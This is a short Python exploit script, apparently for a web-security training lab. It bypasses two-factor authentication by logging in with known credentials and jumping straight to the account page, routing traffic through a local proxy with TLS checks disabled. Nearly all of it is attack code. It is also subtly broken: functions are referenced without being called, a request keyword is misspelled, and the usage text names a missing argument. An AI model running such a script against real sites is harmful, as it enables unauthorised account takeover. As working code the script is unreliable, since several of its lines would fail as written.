import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'https':'http://127.0.0.1:8080',
    'http':'http://127.0.0.1:8080'
}

def mf_access(base_url,s):
    path = "/login"
    login_url = base_url+path
    data={"username": "carlos", "password": "montoya"}
    r=s.post(login_url,data=data,allow_redirect = False, verify= False,proxies = proxies)
    #accessing directly into "my-account" without MFA

    new_path = "/my-account"
    login_url = base_url+new_path
    r= s.post(login_url,verify =False,proxies=proxies)
    if "Log out" in r.text:
        print("The attack is successfull")
    else:
        print("Exploit failed")
        sys.exit(-1)

def main():
    try:
        base_url = sys.argv[1].strip
    except IndexError:
        print("syntax : Python <filename> <url> <Payload>")
        sys.exit(-1)
    s = requests.session
    mf_access(base_url,s)


if __name__ == "__main__":
    main()